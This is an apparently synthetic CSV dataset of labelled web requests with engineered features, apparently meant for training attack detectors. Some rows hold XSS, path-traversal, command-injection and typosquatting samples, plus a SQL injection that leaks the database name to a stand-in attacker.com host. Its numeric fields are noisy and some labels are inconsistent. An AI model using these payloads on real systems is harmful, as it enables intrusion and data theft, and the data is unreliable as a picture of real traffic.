timestamp,source_ip,destination_ip,protocol,http_method,url,request_headers,request_body,response_code,response_size,response_headers,user_agent,payload_raw,attack_type_label,hour,day_of_week,is_weekend,is_attack,parsed_request_headers,parsed_response_headers,Host,User-Agent,Accept,Content-Type,Server,url_length,url_num_params,url_num_special_chars,url_has_sql_keywords,url_has_xss_patterns,url_has_cmd_injection,url_has_traversal,url_has_ssrf_patterns,url_has_typosquatting,url_contains_ip,url_has_credential_patterns,payload_length,request_body_length,payload_special_chars,payload_num_sql_keywords,payload_num_xss_patterns,payload_has_encoding,payload_is_empty,payload_contains_hex,combined_payload,response_code_group,is_error_response,is_success_response,is_redirect_response,response_size_ratio,is_redirect,payload_length_safe,response_payload_ratio,source_ip_freq,source_ip_attack_ratio,is_known_attacker_ip,destination_ip_freq,destination_ip_attack_count,is_attack_tool_ua,ua_is_browser,ua_is_bot,ua_length,server_type,attack_pattern_sql,attack_pattern_xss,attack_pattern_cmd,attack_pattern_traversal,attack_pattern_ssrf,attack_pattern_typosquatting,attack_pattern_credential,special_chars_ratio,url_param_ratio,is_https,is_post_method,is_get_method,url_path_depth,url_has_sensitive_file,timestamp_min,requests_per_ip_per_minute,source_ip_error_ratio
2026-03-14 15:35:11,172.16.0.154,34.120.45.67,http,get,https://micrsoft.com/login?redirect=/dashboard,"{""Host"":""104.18.24.12"",""User-Agent"":""XSStrike/3.1.5"",""Accept"":""*/*""}",,196.4860818505217,3562.5937761136665,"{""Content-Type"":""text/html"",""Server"":""Apache""}",Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0,micrsoft.com,typosquatting_url_spoofing,14.286785069216704,5.121493221071998,1,1,"{'Host': '104.18.24.12', 'User-Agent': 'XSStrike/3.1.5', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Apache'}",104.18.24.12,Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0,*/*,text/html,Apache,46.34717624226738,0.9923516033448961,7.440551114134693,0,0,0,0,0,0,0,0,94.3896341219259,0.5028842431888003,0.07711926807583065,-0.05617335604242984,0.07936166616915344,0,0,0,micrsoft.com,2xx,0,1,0,310.3845333901246,0,1,37.743485386454175,7.609149225491892,0.40382968983772666,0,1013.6153533272063,589.3724817832132,1,0,0,10.163109839497606,Apache,0.018523435444121064,0.00120938997332161,0.0,0.0,0.0,0.0,0.0,0.16053947009071742,0.021895281804719016,0,0,0,0.9940064350378575,0,2026-03-14 15:35:00,1,0.2844954417013334
2026-03-14 15:38:36,192.168.1.103,185.199.108.153,https,get,/login?q=books,"{""Host"":""203.0.113.45"",""User-Agent"":""Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"",""Accept"":""*/*""}",,212.19717495192614,1154.2527156739936,"{""Content-Type"":""text/html"",""Server"":""nginx""}",Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0,,normal,21.260878294776095,5.145130715899608,1,0,"{'Host': '203.0.113.45', 'User-Agent': 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'nginx'}",203.0.113.45,Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0,*/*,text/html,nginx,9.775057266724478,0.9606147142559675,3.249235920415396,0,0,0,0,0,0,0,0,4.360668529211034,0.0,0.3650343670794095,-0.027156146343243166,0.03209713781280849,0,1,0,,2xx,0,1,0,-15.307363661084716,0,1,264.6962748812348,11.936883841282087,0.6483090846677458,0,958.3143169087896,575.596526465423,0,0,1,81.81290732730969,nginx,0.009870469227599401,-0.013319627790265522,0.0,0.0,0.0,0.0,0.0,0.3324007043392168,0.07095202868177854,0,0,0,1.0071884405239444,0,2026-03-14 23:13:00,1,0.41830901918331387
2026-03-14 15:39:43,172.16.0.170,10.0.0.1,http,get,/profile,"{""Host"":""104.18.24.12"",""User-Agent"":""Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15"",""Accept"":""*/*""}",,187.80863065363957,2717.946449984096,"{""Content-Type"":""text/html"",""Server"":""nginx""}","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,normal,13.946309599452395,4.916274741334334,1,0,"{'Host': '104.18.24.12', 'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'nginx'}",104.18.24.12,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",*/*,text/html,nginx,8.734173778603548,0.027561475996377576,1.0917006545577366,0,0,0,0,0,0,0,0,0.0,1.441442124295874,0.01586335028375865,0.04031889128447608,-0.07139746791259349,0,1,0,,2xx,0,1,0,-6.343963329624123,0,0,2717.946449984096,11.311645634074251,0.4891008941285594,0,994.1748494473077,576.1543194001458,0,0,0,83.03576336634949,nginx,0.03845804083494779,0.02515642663866288,0.0,0.0,0.0,0.0,0.0,0.12499186325237986,-0.001678464425082426,0,0,0,1.0308493728038475,0,2026-03-14 15:39:00,1,0.45700097844453186
2026-03-14 15:40:21,185.199.108.251,192.168.1.1,http,get,/login?category=product1,"{""Host"":""192.168.1.1"",""User-Agent"":""Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15"",""Accept"":""*/*""}",,233.1472704174109,2060.7010662598946,"{""Content-Type"":""text/html"",""Server"":""nginx""}","Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",,normal,14.672179528561536,5.150137569690989,1,0,"{'Host': '192.168.1.1', 'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'nginx'}",192.168.1.1,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",*/*,text/html,nginx,22.902174323022848,0.957422544293808,2.8088361664682737,0,0,0,0,0,0,0,0,2.8813516958102916,0.32958111204645013,-0.07890419391215268,0.008859920402072403,0.008091961882280431,0,1,0,,2xx,0,1,0,-8.446659437324541,0,1,715.185539223245,8.045650667189808,0.7374076394729802,0,1001.6616059779768,618.386827342146,0,0,0,79.04270152819245,nginx,0.007320297780951438,0.009332766744450894,0.0,0.0,0.0,0.0,0.0,0.12264495618848895,0.041280422114263776,0,0,0,1.0063885784668962,0,2026-03-14 15:40:00,1,0.3925809216891016
2026-03-14 15:44:09,10.0.0.79,185.199.108.153,https,post,/comment,"{""Host"":""3.12.45.78"",""User-Agent"":""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36"",""Accept"":""*/*""}",comment=javascript%3Aalert%28%27DOM%20XSS%27%29,444.1610217563536,1649.8924343561948,"{""Content-Type"":""text/html"",""Server"":""Apache""}","Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",javascript:alert('dom xss'),xss,16.996142865155548,5.018340213656113,1,1,"{'Host': '3.12.45.78', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Apache'}",3.12.45.78,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",*/*,text/html,Apache,10.232821871086086,0.037945900565347995,0.8463647390504291,0,0,0,0,0,0,0,0,37.290764171298704,46.34906843015213,2.1074746024479185,0.04291194496525929,2.9891419366123295,0,0,0,javascript:alert('dom xss')comment=javascript%3Aalert%28%27DOM%20XSS%27%29,4xx,1,0,0,70.04341024880864,0,1,44.24399636267188,9.676624785318587,0.48129631341968554,0,958.2023790322202,575.0604088312576,0,1,0,86.79517050294122,Apache,-0.008621119533525587,0.5098571624192506,0.0,0.0,0.0,0.0,0.0,0.08271078591155012,-0.003243506005936213,0,0,0,0.9657296474379176,0,2026-03-14 15:44:00,1,0.7150099951274227
2026-03-14 15:45:39,172.16.0.133,172.67.128.45,http,get,/view?path=../../../windows/win.ini,"{""Host"":""10.0.0.1"",""User-Agent"":""Nmap Scripting Engine"",""Accept"":""*/*""}",,514.761005325708,946.7212542833358,"{""Content-Type"":""text/html"",""Server"":""Apache""}",Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0,../../../windows/win.ini,directory_traversal,15.343904240043182,4.965569445582151,1,1,"{'Host': '10.0.0.1', 'User-Agent': 'Nmap Scripting Engine', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Apache'}",10.0.0.1,Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0,*/*,text/html,Apache,36.37100234216561,0.9835069577292397,13.881085251929528,0,0,0,1,0,0,0,0,121.82574245347524,0.36085602820894136,-0.13446781501147476,0.01919152738783515,0.040381321403942176,0,0,0,../../../windows/win.ini,5xx,1,0,0,27.45407550002509,0,1,7.771110072609529,8.076402065694666,0.8509514245075499,0,1021.7303653539469,630.308258738862,1,0,0,20.292170370492826,Apache,0.015518458219370238,-0.025051683196251385,0.0,1.0,0.0,0.0,0.0,0.38165253520761283,0.031046463775992118,0,0,0,1.0114996945498564,1,2026-03-14 15:45:00,1,0.7275499521365644
2026-03-14 15:46:17,198.51.100.140,34.120.45.67,https,get,/home,"{""Host"":""172.67.128.45"",""User-Agent"":""Mozilla/5.0 (iPad; CPU OS 16_0 like Mac OS X) AppleWebKit/605.1.15"",""Accept"":""*/*""}",,212.23194657664934,4085.312593970171,"{""Content-Type"":""text/html"",""Server"":""nginx""}",Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm),,normal,15.859124230459065,5.02230805772848,1,0,"{'Host': '172.67.128.45', 'User-Agent': 'Mozilla/5.0 (iPad; CPU OS 16_0 like Mac OS X) AppleWebKit/605.1.15', 'Accept': '*/*'}",,172.67.128.45,Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm),*/*,text/html,nginx,8.324462514799693,-0.04591162719912086,0.7782395712298142,0,0,0,0,0,0,0,0,1.8141193563040212,0.0,-0.12207660077075373,0.020198437615065963,0.042432544421349916,0,1,0,,2xx,0,1,0,17.94397500833249,0,1,2251.953588265186,3.993728950600345,0.513268158017707,0,1009.4743734323023,589.9783495977414,0,0,0,61.123097060285474,nginx,-0.017760858186639965,0.021585753792914185,0.0,0.0,0.0,0.0,0.0,0.09348826664138575,-0.0006843692231975688,0,0,0,0.9741346324953402,0,2026-03-14 15:46:00,1,0.7378830898863945
2026-03-14 15:48:13,10.0.0.39,3.12.45.78,https,get,/search?q=javascript:alert('xss'),"{""Host"":""172.67.128.45"",""User-Agent"":""Nikto/2.5.0"",""Accept"":""*/*""}",,414.19186945775476,3136.526836325343,"{""Content-Type"":""text/html"",""Server"":""nginx""}","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",javascript:alert('xss'),normal,14.916742229150815,4.879893017152944,1,0,"{'Host': '172.67.128.45', 'User-Agent': 'Nikto/2.5.0', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'nginx'}",172.67.128.45,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",*/*,text/html,nginx,35.54080296652268,0.9940633849182318,3.2480945782468837,0,0,0,0,0,0,0,0,20.211194589353497,0.09697320610433871,1.9374962902254758,0.018597485244078067,2.928432962803858,0,0,0,javascript:alert('xss'),4xx,1,0,0,120.466742367348,0,1,155.1876027148612,13.97560991549447,0.5608158319921477,0,949.1581705594225,543.6005785101979,1,0,0,12.939640206629317,nginx,-0.005021526225091236,1.002361587303596,0.0,0.0,0.0,0.0,0.0,0.09139057947864586,0.029965635185185927,0,0,0,0.9475872878343601,0,2026-03-14 15:48:00,1,0.5076989106058528
2026-03-14 15:48:53,10.0.0.206,10.0.0.1,https,get,/api/v1/products?where=home,"{""Host"":""185.199.108.153"",""User-Agent"":""Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15"",""Accept"":""*/*""}",,177.76769335733692,3253.1953544455187,"{""Content-Type"":""text/html"",""Server"":""nginx""}",Nmap Scripting Engine,,normal,22.47846763080204,5.391876267200713,1,0,"{'Host': '185.199.108.153', 'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'nginx'}",185.199.108.153,Nmap Scripting Engine,*/*,text/html,nginx,27.134977279971775,0.9934093447044782,4.276176807825556,0,0,0,0,0,0,0,0,0.0,0.0,0.1661761154228358,0.048922849183185756,-0.0002497582552141079,0,1,0,,2xx,0,1,0,16.30000544190333,0,0,3253.1953544455187,13.41850536179553,0.6482338713859215,0,996.0481055172937,577.4374618387036,0,0,0,69.98534873613455,nginx,0.018239610293783955,-0.001239415988782605,0.0,0.0,0.0,0.0,0.0,0.15758910588739597,0.035861705441505104,0,0,0,2.9789595670829683,0,2026-03-14 23:52:00,1,0.614769073154769
2026-03-14 15:51:19,192.168.1.170,3.12.45.78,http,get,/register?sort=2,"{""Host"":""104.18.24.12"",""User-Agent"":""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36"",""Accept"":""*/*""}",,193.2689675492585,2616.2362462308656,"{""Content-Type"":""text/html"",""Server"":""Apache""}",Nikto/2.5.0,,normal,2.9881957048996357,6.0498881472839505,1,0,"{'Host': '104.18.24.12', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Apache'}",104.18.24.12,Nikto/2.5.0,*/*,text/html,Apache,16.310471603271196,1.0118636256559141,2.621473129098481,0,0,0,0,0,0,0,0,0.0,0.0,0.1829084885800959,0.02607650678418685,0.05102495397239179,0,1,0,,2xx,0,1,0,-8.05219034561121,0,0,2616.2362462308656,5.8269813767471215,0.7124067924950784,0,950.593316636594,547.498371585155,0,1,0,82.57803771316932,Apache,0.025129105937883818,0.024942212196088602,0.0,0.0,0.0,0.0,0.0,0.16072331891204933,0.062490140097447466,0,0,0,0.9103296792383402,0,2026-03-15 03:06:00,1,0.5000400249876641
2026-03-14 15:55:10,172.16.0.86,52.45.123.89,https,get,/ping?ip=127.0.0.1&& ls -la,"{""Host"":""3.12.45.78"",""User-Agent"":""BurpSuite/2023.12"",""Accept"":""*/*""}",,392.0498061007053,776.7876166529726,"{""Content-Type"":""text/html"",""Server"":""nginx""}",Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0,,command_injection,16.502798256986253,5.112477483172555,1,1,"{'Host': '3.12.45.78', 'User-Agent': 'BurpSuite/2023.12', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'nginx'}",3.12.45.78,Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0,*/*,text/html,nginx,25.5802286694927,3.0138898772120943,9.073387287236942,0,0,1,0,1,0,1,0,111.26249385715634,1.173373357068216,1.9132464667241582,0.013515453814690345,-0.035182273559397195,0,0,0,&& ls -la,4xx,1,0,0,127.11111618149846,0,1,6.981576537824566,10.440590399545211,0.5870215718511186,0,992.7725862946471,581.4027774607362,1,0,0,18.028119744149482,nginx,0.0028758534876979084,-0.010376742653969317,1.0,0.0,1.0,0.0,0.0,0.35470313438042,0.11335249853649242,0,0,0,1.0048396948832297,0,2026-03-14 15:55:00,1,0.461672209573879
2026-03-14 15:56:53,185.199.108.229,34.120.45.67,http,get,"/search?q=' and load_file(concat('\\',database(),'.attacker.com\'))--","{""Host"":""52.45.123.89"",""User-Agent"":""XSStrike/3.1.5"",""Accept"":""*/*""}",,285.8244097443107,2455.0516473770595,"{""Content-Type"":""text/html"",""Server"":""nginx""}",SQLmap/1.8.4,"' and load_file(concat('\\',database(),'.attacker.com\'))--",sql_injection,14.147918451116762,4.689783476819929,1,1,"{'Host': '52.45.123.89', 'User-Agent': 'XSStrike/3.1.5', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'nginx'}",52.45.123.89,SQLmap/1.8.4,*/*,text/html,nginx,67.07940644591231,1.0306594535223845,8.541889566583539,1,0,0,0,0,0,0,0,163.13737273299853,0.0,5.037994115662119,1.0124667255434059,0.0011796099559194797,0,0,0,"' and load_file(concat('\\',database(),'.attacker.com\'))--",3xx,0,0,1,41.24051410861843,1,1,15.048983603500591,1.0996798765519478,0.9757185933467071,1,1005.4274793728252,586.5430096529186,1,0,0,17.388630384409815,nginx,0.984722746202569,-0.02084861287219494,0.0,0.0,0.0,0.0,0.0,0.12733996943564285,0.015863530524402987,0,0,0,1.0248874065848188,1,2026-03-14 15:56:00,1,0.003564283309970156
2026-03-14 15:57:24,198.51.100.53,172.67.128.45,http,get,/.../profile?sort=1&sort=price;desc,"{""Host"":""192.168.1.1"",""User-Agent"":""python-requests/2.28.0"",""Accept"":""*/*""}",,214.93353304723755,2877.518354199849,"{""Content-Type"":""text/html"",""Server"":""Cloudflare""}","Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",,normal,14.677343343874654,4.610236976883651,1,0,"{'Host': '192.168.1.1', 'User-Agent': 'python-requests/2.28.0', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Cloudflare'}",192.168.1.1,"Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",*/*,text/html,Cloudflare,37.552335823986986,2.012653978338116,9.292063002377775,0,0,1,1,0,0,0,0,0.35644048977896775,0.0,0.0006980651489511076,0.011052100596831317,-0.01879953973501178,0,1,0,,2xx,0,1,0,16.60598151224984,0,1,8072.927842693254,3.2287340443573935,0.703582079692263,0,1020.898375249276,629.0089609706722,0,0,1,18.96985514857522,Cloudflare,-0.016306939744232713,-0.0013395844648157534,1.0,1.0,0.0,0.0,0.0,0.24744300982849549,0.05935952688712576,0,0,0,1.9994221189812664,0,2026-03-14 15:57:00,1,0.34168972069613157
2026-03-14 15:58:08,192.168.1.205,198.51.100.23,http,get,https://twiter.com/login?redirect=/dashboard,"{""Host"":""104.18.24.12"",""User-Agent"":""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36"",""Accept"":""*/*""}",,191.5776273984518,737.8851777876258,"{""Content-Type"":""text/html"",""Server"":""Apache""}","Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",twiter.com,typosquatting_url_spoofing,15.193668579042527,5.116400090762878,1,1,"{'Host': '104.18.24.12', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Apache'}",104.18.24.12,"Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",*/*,text/html,Apache,42.39199881517128,0.9973744141737476,6.9430445388772375,0,0,0,0,0,0,0,0,80.70888431558797,0.602028480032559,-0.09886050687205047,0.0007235889679305239,-0.009765122297429438,0,0,0,twiter.com,2xx,0,1,0,86.2171102085359,0,1,9.142552075213262,11.868001696933518,0.5820260289920981,0,1056.8300926257302,659.0522051629763,0,1,0,93.40154434241092,Apache,-0.017268589801457,0.00772815833132637,0.0,0.0,0.0,0.0,0.0,0.16378195727804315,0.025120221532487063,0,0,0,1.077157173373887,0,2026-03-14 15:58:00,1,0.3360873071452039
2026-03-14 16:03:25,10.0.0.140,34.120.45.67,https,get,/settings,"{""Host"":""192.168.1.1"",""User-Agent"":""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36"",""Accept"":""*/*""}",,196.05065350398803,2867.5372641544286,"{""Content-Type"":""text/html"",""Server"":""Apache""}","Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",,normal,7.157152524864968,4.748462241638571,1,0,"{'Host': '192.168.1.1', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Apache'}",192.168.1.1,"Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",*/*,text/html,Apache,10.508407249062959,0.03713619999895378,0.7328738029592259,0,0,0,0,0,0,0,0,0.0,0.6533286667674362,0.05737813420554196,-0.013838542062991167,0.04384998573481017,0,1,0,,2xx,0,1,0,-1.545625722675548,0,0,2867.5372641544286,12.963748960817917,0.7749533942876361,0,1009.4186420336155,587.769255562722,0,1,0,85.67163877835053,Apache,-0.006223158887122845,-0.025802783966073977,0.0,0.0,0.0,0.0,0.0,0.0697416635641502,-0.0012573786859437649,0,0,0,0.9110045289622462,0,2026-03-14 07:42:00,1,0.5262314476801011
2026-03-14 16:06:55,172.67.128.55,3.12.45.78,http,post,/products?page=2,"{""Host"":""52.45.123.89"",""User-Agent"":""python-requests/2.28.0"",""Accept"":""*/*""}",email=user@example.com&subscribe=true,299.66752160452694,4484.813601098944,"{""Content-Type"":""text/html"",""Server"":""Cloudflare""}","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",,normal,14.534152899725523,5.030808518680265,1,0,"{'Host': '52.45.123.89', 'User-Agent': 'python-requests/2.28.0', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Cloudflare'}",52.45.123.89,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",*/*,text/html,Cloudflare,16.496809650170853,0.9780499293721978,3.2499765335099653,0,0,0,0,0,0,0,0,0.7632063779862348,36.691893442288055,0.165188969784132,-0.0189449600966746,0.0960155824727391,0,1,0,email=user@example.com&subscribe=true,3xx,0,0,1,13.340986474276596,1,1,5876.278986206051,1.7294387788510541,0.5054999145488828,0,948.6050601339823,547.2528600534663,0,0,1,23.120955897985674,Cloudflare,-0.019283653536863784,0.015199872226006795,0.0,0.0,0.0,0.0,0.0,0.19700636683265035,0.06371573113218013,0,0,0,0.9842063153414619,0,2026-03-14 16:06:00,1,0.0005214763617912276
2026-03-14 16:15:51,10.0.0.22,104.18.24.12,https,post,/.../search?product=laptop,"{""Host"":""198.51.100.23"",""User-Agent"":""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36"",""Accept"":""*/*""}",name=John&message=Hello,200.02150016356103,2097.352286848318,"{""Content-Type"":""text/html"",""Server"":""Cloudflare""}",Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0,,normal,22.462604013692324,5.609295567407524,1,0,"{'Host': '198.51.100.23', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36', 'Accept': '*/*'}",,198.51.100.23,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0,*/*,text/html,Cloudflare,25.5383968880751,1.0312485966508305,7.036709473923938,0,0,0,1,0,0,0,0,1.1051549822809954,23.052410212465702,0.18124181024170535,0.010624668939659096,0.025656553772641803,0,1,0,name=John&message=Hello,2xx,0,1,0,1.449132955134136,0,1,1897.7901927560124,6.793540972835504,0.2838787405195023,0,987.200987104765,616.3114674652707,0,1,0,93.26486676638761,Cloudflare,-0.017956817281658027,0.019398714449601832,0.0,1.0,0.0,0.0,0.0,0.27553450221496323,0.039785312212934125,0,0,0,1.9261681749313992,0,2026-03-14 23:51:00,1,0.42545031833811475
2026-03-14 16:16:05,192.168.1.238,192.168.1.1,http,get,/js/script.js,"{""Host"":""104.18.24.12"",""User-Agent"":""Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0"",""Accept"":""*/*""}",,196.3003652067625,2857.2443195336723,"{""Content-Type"":""text/html"",""Server"":""Cloudflare""}",Mozilla/5.0 (Unknown; Unknown) Unknown,,normal,17.718429876971665,4.974484777364717,1,0,"{'Host': '104.18.24.12', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Cloudflare'}",104.18.24.12,Mozilla/5.0 (Unknown; Unknown) Unknown,*/*,text/html,Cloudflare,12.397430935369364,0.05414954580235573,3.6316227306164137,0,0,0,0,0,0,0,0,2.4946485738356245,0.0,0.03467915586249011,0.007739043977067509,-0.023196808453924807,0,1,0,,2xx,0,1,0,9.333718286592108,0,1,1145.3494289740947,12.444193745029063,0.6650533404271167,0,995.2904969225416,619.1221518258885,0,1,0,69.30424043978435,Cloudflare,-0.0038895622255150806,-0.013620493546479965,0.0,0.0,0.0,0.0,0.0,0.2929334915878049,-0.0020547880888298147,0,0,0,2.010608865063621,0,2026-03-14 16:16:00,1,0.512987594024599
